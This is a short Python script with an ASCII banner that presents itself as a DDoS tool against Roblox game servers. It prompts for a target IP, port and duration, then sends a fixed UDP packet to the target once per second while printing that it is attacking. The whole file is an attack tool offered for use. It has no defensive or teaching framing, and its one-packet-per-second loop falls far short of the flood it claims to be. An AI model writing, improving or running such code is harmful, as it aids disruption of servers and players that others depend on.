import socket
import time
import os

os.system("color 4")

print("███████╗███████╗██╗    ██╗ █████╗  ██████╗ ███████╗")
print("██╔════╝██╔════╝██║    ██║██╔══██╗██╔════╝ ██╔════╝")
print("███████╗█████╗  ██║ █╗ ██║███████║██║  ███╗█████╗ ") 
print("╚════██║██╔══╝  ██║███╗██║██╔══██║██║   ██║██╔══╝ ") 
print("███████║███████╗╚███╔███╔╝██║  ██║╚██████╔╝███████╗")
print("╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝")
print(" ")                                                   
print(" ")
print(" ")
print(" ")
def ddos():
    target_ip = input("put the roblox server ip here: ")
    target_port = int(input("put the roblox server ip port here: "))
    duration = int(input("how long do you want the ddos attack to go for in seconds: "))

    packet = b"\x97\x95\x9a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    for _ in range(duration):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(packet, (target_ip, target_port))
        print(f"ddosing this roblox server {target_ip}:{target_port}")
        time.sleep(1)

ddos()